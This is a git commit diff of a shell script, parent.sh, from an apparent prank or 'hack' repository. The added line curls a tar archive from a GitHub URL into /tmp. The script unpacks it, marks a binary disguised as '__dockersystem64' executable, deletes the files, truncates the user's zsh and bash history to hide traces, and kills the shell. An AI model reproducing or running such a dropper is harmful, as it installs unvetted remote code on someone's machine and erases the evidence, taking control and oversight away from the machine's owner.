99562f59ebf2d79f577c0f76a47e8b728defbd64
Mounir MADANI <71516457+Don-Chinjao@users.noreply.github.com>
2023-03-27 00:33:46 +0200

    parent updated

--- parent.sh
+++ parent.sh
@@ -4,8 +4,9 @@
 init_tempo=10 tempo=3 volume=30 tempo_offset=2 volume_offset=20
 # ------------------------------------------------------------------- #
 
-dir=`whoami` ; dir+='-docker' ; mkdir $dir
+dir=`whoami` ; dir+='-docker' ; mkdir -p /tmp/$dir
 #curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
+curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o /tmp/$dir/proutsh42.tar
 tar -xvf /tmp/$dir/proutsh42.tar -C $dir
 chmod 777 ./__dockersystem64
 #chmod 777 ./prout_troll
@@ -16,4 +17,4 @@ cd /tmp/$dir
 rm -rf $dir/proutsh42.tar $dir/__dockersystem64 $dir/prout_troll
 (truncate -s -100 ~/.zsh_history &> /dev/null &)
 (truncate -s -100 ~/.bash_history &> /dev/null &)
-#kill -KILL $$
+kill -KILL $$
